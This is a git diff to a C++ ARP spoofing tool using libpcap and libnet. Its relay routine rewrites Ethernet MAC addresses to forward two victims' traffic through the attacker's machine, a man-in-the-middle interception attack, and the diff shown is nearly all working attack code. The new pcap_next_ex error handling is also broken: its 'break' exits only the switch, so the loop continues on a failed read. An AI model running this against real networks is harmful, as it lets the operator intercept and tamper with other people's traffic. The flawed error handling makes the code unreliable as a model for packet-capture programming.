@@ -11,7 +11,8 @@ using namespace std;
 ARPSpoofing::ARPSpoofing() {}
 
 bool ARPSpoofing::Init(char *s_ip_str, char *r_ip_str) {
-    this->device = pcap_lookupdev(NULL);
+    // this->device = pcap_lookupdev(NULL);
+    this->device = "eth1";
     cout << ">> Capturing from " << this->device << endl;
 
     // init attacker ip, mac address
@@ -77,11 +78,17 @@ void ARPSpoofing::Recover() {
 }
 
 void ARPSpoofing::_get_mac_addr_through_arp_request(u_int8_t *t_ip, u_int8_t *t_mac) {
-    ARPSpoofing::__read_packet([this, t_ip, t_mac] (pcap_t *handle, pcap_pkthdr header, const u_char *packet) {
+    ARPSpoofing::__read_packet([this, t_ip, t_mac] (pcap_t *handle, pcap_pkthdr *header, const u_char *packet) {
         cout << "ARP Request Packet Sending to " << ARPSpoofing::_uint8_bytes_to_char_bytes(t_ip) << "..." << endl;
         while (true) {
             ARPSpoofing::_send_ARP_request(t_ip, NULL, NULL, NULL);
-            packet = pcap_next(handle, &header);
+            int res = pcap_next_ex(handle, &header, &packet);
+            switch (res) {
+            case 0: continue;
+            case -1:
+            case -2:
+                break;
+            }
             libnet_ethernet_hdr *ethHeader = (libnet_ethernet_hdr*) packet;
             // if (ether_type == ETHERTYPE_ARP) and (ether_dhost == a_mac)
             if (ntohs(ethHeader->ether_type) == ETHERTYPE_ARP &&
@@ -102,9 +109,15 @@ void ARPSpoofing::_get_mac_addr_through_arp_request(u_int8_t *t_ip, u_int8_t *t_
 }
 
 void ARPSpoofing::_relay() {
-    ARPSpoofing::__read_packet([this] (pcap_t *handle, pcap_pkthdr header, const u_char *packet) {
+    ARPSpoofing::__read_packet([this] (pcap_t *handle, pcap_pkthdr *header, const u_char *packet) {
         while (this->kill_relay == false) {
-            packet = pcap_next(handle, &header);
+            int res = pcap_next_ex(handle, &header, &packet);
+            switch (res) {
+            case 0: continue;
+            case -1:
+            case -2:
+                break;
+            }
             libnet_ethernet_hdr *ethHeader = (libnet_ethernet_hdr*) packet;
             // if (ether_type == ETHERTYPE_IP)
             if (ntohs(ethHeader->ether_type) == ETHERTYPE_IP) {
@@ -114,7 +127,7 @@ void ARPSpoofing::_relay() {
                     if (ARPSpoofing::_bytes_equal(ethHeader->ether_shost, this->s_mac, MAC_ADDR_LEN)) {
                         memcpy(ethHeader->ether_shost, this->a_mac, MAC_ADDR_LEN);
                         memcpy(ethHeader->ether_dhost, this->r_mac, MAC_ADDR_LEN);
-                        pcap_sendpacket(handle, packet, header.len);
+                        pcap_sendpacket(handle, packet, header->len);
                         printf("\r>");
                         fflush(stdout);
                     }
@@ -122,7 +135,7 @@ void ARPSpoofing::_relay() {
                     else if (ARPSpoofing::_bytes_equal(ethHeader->ether_shost, this->r_mac, MAC_ADDR_LEN)) {
                         memcpy(ethHeader->ether_shost, this->a_mac, MAC_ADDR_LEN);
                         memcpy(ethHeader->ether_dhost, this->s_mac, MAC_ADDR_LEN);
-                        pcap_sendpacket(handle, packet, header.len);
+                        pcap_sendpacket(handle, packet, header->len);
                         printf("\r<");
                         fflush(stdout);
                     }
@@ -134,7 +147,7 @@ void ARPSpoofing::_relay() {
     });
 }
 
-void ARPSpoofing::__read_packet(std::function<void(pcap_t *handle, pcap_pkthdr header, const u_char *packet)> cb) {
+void ARPSpoofing::__read_packet(std::function<void(pcap_t *handle, pcap_pkthdr *header, const u_char *packet)> cb) {
     pcap_t *handle;                 /* Session handle */
     char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
 
@@ -145,7 +158,7 @@ void ARPSpoofing::__read_packet(std::function<void(pcap_t *handle, pcap_pkthdr h
         return;
     }
 
-    pcap_pkthdr header;
+    pcap_pkthdr *header;
     const u_char *packet;
 
     cb(handle, header, packet); // send ARP Request
